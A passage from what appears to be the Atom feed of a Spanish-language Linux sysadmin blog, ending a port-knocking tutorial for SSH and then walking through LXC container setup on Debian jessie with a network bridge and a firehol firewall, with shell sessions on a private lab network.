Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; server &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.56.3&lt;span class="o"&gt;)&lt;/span&gt;
Host is up.
PORT   STATE    SERVICE
&lt;span class="m"&gt;22&lt;/span&gt;/tcp filtered ssh

Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in &lt;span class="m"&gt;2&lt;/span&gt;.13 seconds
gerard@workstation:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que sale &lt;strong&gt;filtered&lt;/strong&gt;, que significa que el firewall lo está bloqueando. Ahora vamos a lanzar la secuencia de &lt;em&gt;knock&lt;/em&gt; usando el helper &lt;strong&gt;knock&lt;/strong&gt;, que en &lt;em&gt;Debian&lt;/em&gt; se encuentra en el mismo paquete &lt;em&gt;knockd&lt;/em&gt;. Acto seguido, el puerto de &lt;em&gt;SSH&lt;/em&gt; queda abierto (en otras palabras: escuchando). Ahora sería posible iniciar sesión por &lt;em&gt;SSH&lt;/em&gt; en la máquina.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@workstation:~$ knock &lt;span class="m"&gt;192&lt;/span&gt;.168.56.3 &lt;span class="m"&gt;123&lt;/span&gt; &lt;span class="m"&gt;456&lt;/span&gt; &lt;span class="m"&gt;789&lt;/span&gt;
gerard@workstation:~$ nmap -PN &lt;span class="m"&gt;192&lt;/span&gt;.168.56.3 -p &lt;span class="m"&gt;22&lt;/span&gt;

Starting Nmap &lt;span class="m"&gt;5&lt;/span&gt;.21 &lt;span class="o"&gt;(&lt;/span&gt; http://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2015&lt;/span&gt;-10-28 &lt;span class="m"&gt;17&lt;/span&gt;:34 CET
Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; server &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.56.3&lt;span class="o"&gt;)&lt;/span&gt;
Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0011s latency&lt;span class="o"&gt;)&lt;/span&gt;.
PORT   STATE SERVICE
&lt;span class="m"&gt;22&lt;/span&gt;/tcp open  ssh

Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in &lt;span class="m"&gt;0&lt;/span&gt;.07 seconds
gerard@workstation:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente comprobamos que, transcurridos los 5 segundos configurados, el puerto vuelve a verse como &lt;strong&gt;filtrado&lt;/strong&gt;, con lo que no se puede establecer nuevas conexiones en este puerto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@workstation:~$ nmap -PN &lt;span class="m"&gt;192&lt;/span&gt;.168.56.3 -p &lt;span class="m"&gt;22&lt;/span&gt;

Starting Nmap &lt;span class="m"&gt;5&lt;/span&gt;.21 &lt;span class="o"&gt;(&lt;/span&gt; http://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2015&lt;/span&gt;-10-28 &lt;span class="m"&gt;17&lt;/span&gt;:34 CET
Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; server &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.56.3&lt;span class="o"&gt;)&lt;/span&gt;
Host is up.
PORT   STATE    SERVICE
&lt;span class="m"&gt;22&lt;/span&gt;/tcp filtered ssh

Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in &lt;span class="m"&gt;2&lt;/span&gt;.08 seconds
gerard@workstation:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto queda protegido el acceso por &lt;em&gt;SSH&lt;/em&gt; a la máquina.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="firehol"></category><category term="port knocking"></category><category term="ssh"></category><category term="nmap"></category></entry><entry><title>Virtualizando contenedores LXC con acceso a la red local</title><link href="http://www.linuxsysadmin.ml/2015/10/virtualizando-contenedores-lxc-con-acceso-red-local.html" rel="alternate"></link><published>2015-10-15T12:00:00+02:00</published><updated>2015-10-15T12:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-10-15:/2015/10/virtualizando-contenedores-lxc-con-acceso-red-local.html</id><summary type="html">&lt;p&gt;En este tutorial se propone montar un servidor de contenedores LXC, de forma que todos los contenedores queden expuestos a la misma red que el servidor que los aloja. Para protegerlos de posibles ataques de esta red, pondremos un firewall basado en &lt;em&gt;iptables&lt;/em&gt; mediante una capa de abstracción llamada &lt;em&gt;firehol …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;En este tutorial se propone montar un servidor de contenedores LXC, de forma que todos los contenedores queden expuestos a la misma red que el servidor que los aloja. Para protegerlos de posibles ataques de esta red, pondremos un firewall basado en &lt;em&gt;iptables&lt;/em&gt; mediante una capa de abstracción llamada &lt;em&gt;firehol&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para conseguir este objetivo, se van a usar las siguientes tecnologías:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Debian jessie&lt;/strong&gt;: Es necesario usar alguna distribución de linux para hacer funcionar LXC&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;LXC&lt;/strong&gt;: Tecnología que permite aislar los contenedores entre sí y darles entidad propia&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Bridges&lt;/strong&gt;: Un bridge es en software el equivalente a un switch hardware&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Firehol&lt;/strong&gt;: Una serie de scripts para construir firewalls basados en iptables de forma fácil&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;En cuanto a las capacidades hardware, vamos a hacer el tutorial con un equipo de capacidades modestas, virtualizado en una máquina virtual VirtualBox.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CPUs&lt;/strong&gt;: 1&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Memoria&lt;/strong&gt;: 256 Mb&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Disco&lt;/strong&gt;: 2 Gb&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Red&lt;/strong&gt;: 1 interfaz (&lt;em&gt;eth0&lt;/em&gt;) &lt;em&gt;host-only&lt;/em&gt; o &lt;em&gt;bridged&lt;/em&gt; con IP fija&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Partimos de una distribución &lt;em&gt;Debian jessie&lt;/em&gt; instalada con un CD &lt;em&gt;netinstall&lt;/em&gt; y con el único paquete instalado &lt;em&gt;openssh-server&lt;/em&gt;, para mi comodidad.&lt;/p&gt;
&lt;h2&gt;Preparar el servidor&lt;/h2&gt;
&lt;p&gt;El primer paso consiste en instalar las tecnologías usadas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# apt-get install bridge-utils firehol lxc
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias       
Leyendo la información de estado... Hecho
...
Configurando lxc &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;:1.0.6-6+deb8u1&lt;span class="o"&gt;)&lt;/span&gt; ...
Configurando dh-python &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.20141111-2&lt;span class="o"&gt;)&lt;/span&gt; ...
Procesando disparadores para libc-bin &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.19-18+deb8u1&lt;span class="o"&gt;)&lt;/span&gt; ...
Procesando disparadores para systemd &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;215&lt;/span&gt;-17+deb8u2&lt;span class="o"&gt;)&lt;/span&gt; ...
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Acto seguido debemos modificar la configuración de red, para que la interfaz de red de la máquina represente la salida de todas las IPs que maneja el bridge y para que el host obtenga una dirección de red en el bridge.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ANTES&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /etc/network/interfaces
&lt;span class="nb"&gt;source&lt;/span&gt; /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address &lt;span class="m"&gt;192&lt;/span&gt;.168.56.4
    netmask &lt;span class="m"&gt;255&lt;/span&gt;.255.255.0
    gateway &lt;span class="m"&gt;192&lt;/span&gt;.168.56.1
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;DESPUES&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /etc/network/interfaces
&lt;span class="nb"&gt;source&lt;/span&gt; /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

auto lxc0
iface lxc0 inet static
    bridge_ports eth0
    address &lt;span class="m"&gt;192&lt;/span&gt;.168.56.4
    netmask &lt;span class="m"&gt;255&lt;/span&gt;.255.255.0
    gateway &lt;span class="m"&gt;192&lt;/span&gt;.168.56.1
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este punto es necesario reconfigurar la red, siendo especialmente importante que &lt;em&gt;eth0&lt;/em&gt; quede sin dirección IP asignada (en mi caso tuve que reiniciar la máquina).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# ip addr
&lt;span class="m"&gt;1&lt;/span&gt;: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu &lt;span class="m"&gt;65536&lt;/span&gt; qdisc noqueue state UNKNOWN group default 
    link/loopback &lt;span class="m"&gt;00&lt;/span&gt;:00:00:00:00:00 brd &lt;span class="m"&gt;00&lt;/span&gt;:00:00:00:00:00
    inet &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
&lt;span class="m"&gt;2&lt;/span&gt;: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu &lt;span class="m"&gt;1500&lt;/span&gt; qdisc pfifo_fast master lxc0 state UP group default qlen &lt;span class="m"&gt;1000&lt;/span&gt;
    link/ether &lt;span class="m"&gt;08&lt;/span&gt;:00:27:e4:0a:60 brd ff:ff:ff:ff:ff:ff
&lt;span class="m"&gt;3&lt;/span&gt;: lxc0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu &lt;span class="m"&gt;1500&lt;/span&gt; qdisc noqueue state UP group default 
    link/ether &lt;span class="m"&gt;08&lt;/span&gt;:00:27:e4:0a:60 brd ff:ff:ff:ff:ff:ff
    inet &lt;span class="m"&gt;192&lt;/span&gt;.168.56.4/24 brd &lt;span class="m"&gt;192&lt;/span&gt;.168.56.255 scope global lxc0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fee4:a60/64 scope link 
       valid_lft forever preferred_lft forever
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El último paso consiste en activar el firewall con unas reglas básicas, para proteger el equipo anfitrión de posibles ataques o intrusiones, dejando solamente el acceso a SSH. Con firehol es posible combinar el demonio &lt;em&gt;knockd&lt;/em&gt; para ocultar el puerto tras una secuencia de port knocking; en principio sería suficiente con forzar la entrada SSH por claves RSA.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /etc/firehol/firehol.conf 
interface lxc0 world
    policy drop
    protection strong
    server ssh accept
    client all accept
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hay que modificar otro fichero para permitir el inicio del firewall:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ANTES&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# grep START /etc/default/firehol 
&lt;span class="c1"&gt;#To enable firehol at startup set START_FIREHOL=YES&lt;/span&gt;
&lt;span class="nv"&gt;START_FIREHOL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;NO
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;DESPUES&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# grep START /etc/default/firehol 
&lt;span class="c1"&gt;#To enable firehol at startup set START_FIREHOL=YES&lt;/span&gt;
&lt;span class="nv"&gt;START_FIREHOL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;YES
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y para acabar, (re)iniciamos el servicio firehol.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# service firehol restart

Broadcast message from systemd-journald@lxc &lt;span class="o"&gt;(&lt;/span&gt;Wed &lt;span class="m"&gt;2015&lt;/span&gt;-10-14 &lt;span class="m"&gt;16&lt;/span&gt;:59:30 CEST&lt;span class="o"&gt;)&lt;/span&gt;:

FireHOL&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;620&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: Firewall has been stopped. Policy is ACCEPT EVERYTHING!


Message from syslogd@lxc at Oct &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:59:30 ...
 FireHOL&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;493&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: Firewall has been stopped. Policy is ACCEPT EVERYTHING!
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creación de contenedores&lt;/h2&gt;
&lt;p&gt;La creación de contenedores pasa por usar las herramientas estándar de la distribución, a lo solo tendremos que modificar algunas configuraciones propias de nuestra red.&lt;/p&gt;
&lt;p&gt;Creamos un contenedor &lt;em&gt;webserver&lt;/em&gt; como demostración. La primera que se crea es un poco lenta porque hace un &lt;em&gt;debootstrap&lt;/em&gt; de una distribución debian estable para crear una cache en &lt;em&gt;/var/cache/lxc&lt;/em&gt;; las siguientes se benefician de esta caché y solo la actualizan, acelerando el proceso.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-create -n webserver -t debian
debootstrap is /usr/sbin/debootstrap
Checking cache download in /var/cache/lxc/debian/rootfs-jessie-i386 ... 
Downloading debian minimal ...
...
I: Base system installed successfully.
Download complete.
Copying rootfs to /var/lib/lxc/webserver/rootfs...
...
Current default &lt;span class="nb"&gt;time&lt;/span&gt; zone: &lt;span class="s1"&gt;&amp;#39;Europe/Madrid&amp;#39;&lt;/span&gt;
Local &lt;span class="nb"&gt;time&lt;/span&gt; is now:      Wed Oct &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;17&lt;/span&gt;:26:37 CEST &lt;span class="m"&gt;2015&lt;/span&gt;.
Universal Time is now:  Wed Oct &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:26:37 UTC &lt;span class="m"&gt;2015&lt;/span&gt;.

Root password is &lt;span class="s1"&gt;&amp;#39;sFj7Jm9N&amp;#39;&lt;/span&gt;, please change !
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Acabada la generación del contenedor, vamos a configurarle algunos parámetros; que tenga una interfaz &lt;em&gt;eth0&lt;/em&gt; activa y enchufada al bridge &lt;em&gt;lxc0&lt;/em&gt;, y que el contenedor se autoinicie en cada reinicio del anfitrión.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /var/lib/lxc/webserver/config 
...
lxc.start.auto &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
lxc.network.type &lt;span class="o"&gt;=&lt;/span&gt; veth
lxc.network.flags &lt;span class="o"&gt;=&lt;/span&gt; up
lxc.network.link &lt;span class="o"&gt;=&lt;/span&gt; lxc0
lxc.network.name &lt;span class="o"&gt;=&lt;/span&gt; eth0
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y para que su interfaz de red sea funcional, vamos a configurarle una dirección IP. Todo esto se hace en los ficheros habituales, teniendo en cuenta que un contenedor es una jaula, y que esta se encuentra en &lt;em&gt;/var/lib/lxc/webserver/rootfs/&lt;/em&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /var/lib/lxc/webserver/rootfs/etc/network/interfaces
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address &lt;span class="m"&gt;192&lt;/span&gt;.168.56.10
    netmask &lt;span class="m"&gt;255&lt;/span&gt;.255.255.0
    gateway &lt;span class="m"&gt;192&lt;/span&gt;.168.56.1
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El contenedor ya está funcional, y se puede levantar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-start -n webserver -d
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sin embargo, el firewall impide que se llegue al mismo; tendremos que poner reglas para permitir el flujo de red hacia la nueva dirección IP configurada para el contenedor. Esto se consigue con reglas de &lt;em&gt;forward&lt;/em&gt; que entren por el bridge y salgan por el mismo hacia nuestro contenedor.&lt;/p&gt;
&lt;p&gt;Ya de paso habilitamos reglas para que todo lo que pase por el bridge hacia internet se permita. Como particularidad de nuestra red, el servidor anfitrión tiene un servidor DNS &lt;em&gt;dnsmasq&lt;/em&gt;; así que añadimos también esa ruta.&lt;/p&gt;
&lt;p&gt;Por ejemplo, suponiendo que queremos habilitar el servicio &lt;em&gt;SSH&lt;/em&gt; (tcp 22) y el puerto del servicio &lt;em&gt;HTTP&lt;/em&gt; (tcp 80), pondremos lo siguiente en la configuración del firewall (tras lo cual lo reiniciaremos):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /etc/firehol/firehol.conf 
interface lxc0 world
    policy drop
    protection strong
    server ssh accept
    client all accept

router internal inface lxc0 outface lxc0
    policy drop
    client all accept
    group with dst not &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;UNROUTABLE_IPS&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
        route all accept
    group end
    group with dst &lt;span class="m"&gt;192&lt;/span&gt;.168.56.1
        route dns accept
    group end
    group with dst &lt;span class="m"&gt;192&lt;/span&gt;.168.56.10
        route ssh accept
        route http accept
    group end
root@lxc:~# service firehol restart

Broadcast message from systemd-journald@lxc &lt;span class="o"&gt;(&lt;/span&gt;Wed &lt;span class="m"&gt;2015&lt;/span&gt;-10-14 &lt;span class="m"&gt;17&lt;/span&gt;:43:38 CEST&lt;span class="o"&gt;)&lt;/span&gt;:

FireHOL&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;8690&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: Firewall has been stopped. Policy is ACCEPT EVERYTHING!


Message from syslogd@lxc at Oct &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;17&lt;/span&gt;:43:38 ...
 FireHOL&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;8565&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: Firewall has been stopped. Policy is ACCEPT EVERYTHING!
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solamente queda entrar al contenedor, por ejemplo por &lt;em&gt;SSH&lt;/em&gt; para instalar lo que se necesite; en este caso con un &lt;em&gt;nginx&lt;/em&gt; sería suficiente como demostración.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@workstation:~$ ssh root@192.168.56.10
root@192.168.56.10&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 

The programs included with the Debian GNU/Linux system are free software&lt;span class="p"&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class="k"&gt;for&lt;/span&gt; each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@webserver:~# apt-get install nginx-light
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias... Hecho
Se instalarán los siguientes paquetes extras:
  nginx-common
Paquetes sugeridos:
  fcgiwrap nginx-doc ssl-cert
Se instalarán los siguientes paquetes NUEVOS:
  nginx-common nginx-light
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;2&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;439&lt;/span&gt; kB de archivos.
Se utilizarán &lt;span class="m"&gt;1&lt;/span&gt;.040 kB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
Configurando nginx-common &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.6.2-5&lt;span class="o"&gt;)&lt;/span&gt; ...
Configurando nginx-light &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.6.2-5&lt;span class="o"&gt;)&lt;/span&gt; ...
Procesando disparadores para systemd &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;215&lt;/span&gt;-17+deb8u2&lt;span class="o"&gt;)&lt;/span&gt; ...
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto ya tenemos nuestro contenedor en marcha y ofreciendo servicios en nuestra red local de forma segura.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="lxc"></category><category term="bridge"></category><category term="firehol"></category></entry></feed>